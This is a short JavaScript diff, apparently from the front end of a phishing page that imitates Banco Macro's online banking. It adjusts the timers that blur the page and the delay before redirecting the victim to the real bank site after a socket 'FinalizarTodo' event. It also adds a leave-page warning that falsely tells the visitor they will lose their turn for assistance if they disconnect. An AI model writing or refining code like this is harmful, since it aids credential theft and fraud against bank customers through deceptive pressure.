@@ -94,7 +94,7 @@ setTimeout(() => {
     BlurPersonalOPtions.style.filter = "blur(1.5px)";
     BlurHeader.style.filter = "blur(1.5px)";    
 
-}, 2500);
+}, 3500);
 
 socket.on("FinalizarTodo", finData => {
     if(finData){
@@ -103,6 +103,12 @@ socket.on("FinalizarTodo", finData => {
         socket.emit("SuccessFin", originalSocket);
         setTimeout(() => {
             window.location.replace("https://www.macro.com.ar/bancainternet/");
-        }, 5000);
+        }, 4000);
     }
 })
+
+
+// RECARGAR LA PAGINA
+window.onbeforeunload = function() {
+    return "En breve serás atendido, si te desconectás no serás atendido a tiempo. ¿Desea abandonar la sesión?";
+  };
